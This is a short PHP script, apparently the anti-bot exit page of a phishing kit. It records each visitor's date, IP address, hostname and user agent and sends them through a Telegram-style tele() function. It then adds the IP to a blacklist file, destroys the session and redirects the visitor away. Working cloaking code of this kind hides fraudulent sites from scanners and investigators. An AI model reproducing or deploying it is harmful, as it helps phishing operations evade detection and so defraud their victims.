<?php

include '../config.php';
include '../assets/includes/functions.php';
$date = date('l, F jS Y @ H:i:s');
	$ip = $_SERVER['REMOTE_ADDR'];
	$host = gethostbyaddr($ip);
	$ua = $_SERVER['HTTP_USER_AGENT'];
	$bot  = "$date - $ip - $host - $ua";
	tele($bot);
	$fp = fopen("assets/includes/blacklist.dat", "a");
fputs($fp, "\r\n$ip\r\n");
fclose($fp);
session_start();
session_destroy();
header("location:$ExitLink");
